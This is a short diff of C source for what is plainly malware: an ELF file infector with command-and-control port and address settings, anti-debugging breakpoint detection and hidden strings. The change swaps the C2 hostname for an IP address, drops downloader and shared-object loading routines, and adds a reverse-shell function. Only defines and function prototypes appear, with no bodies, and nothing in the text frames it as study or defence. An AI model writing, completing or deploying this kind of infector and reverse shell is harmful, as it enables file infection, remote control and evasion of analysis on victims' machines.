@@ -25,8 +25,8 @@
 
 #define infection_target "./test" // file to be infected
 
-#define port 1337 // port to c2
-#define hostname "localhost" // hostname of c2
+#define port 1337 // c2 port
+#define addr "127.0.0.1" // c2 ip address
 
 // macro defining the number of 0xCC's found in the .text section, over written by anti-debug.sh
 #define count 0
@@ -42,8 +42,6 @@ always_inline optimize(opt) static inline long elf_size(FILE*);
 always_inline optimize(opt) static inline int is_infected(char*);
 always_inline optimize(opt) static inline void infect(FILE*, FILE*);
 always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
-always_inline optimize(opt) static inline void load_so(int, int);
-always_inline optimize(opt) static inline void process_connection(int);
-always_inline optimize(opt) static inline void downloader();
+always_inline optimize(opt) static inline void reverse_shell();
 always_inline optimize(opt) static inline char* hidden_string();
 constructor optimize(opt) void detect_breakpoints();
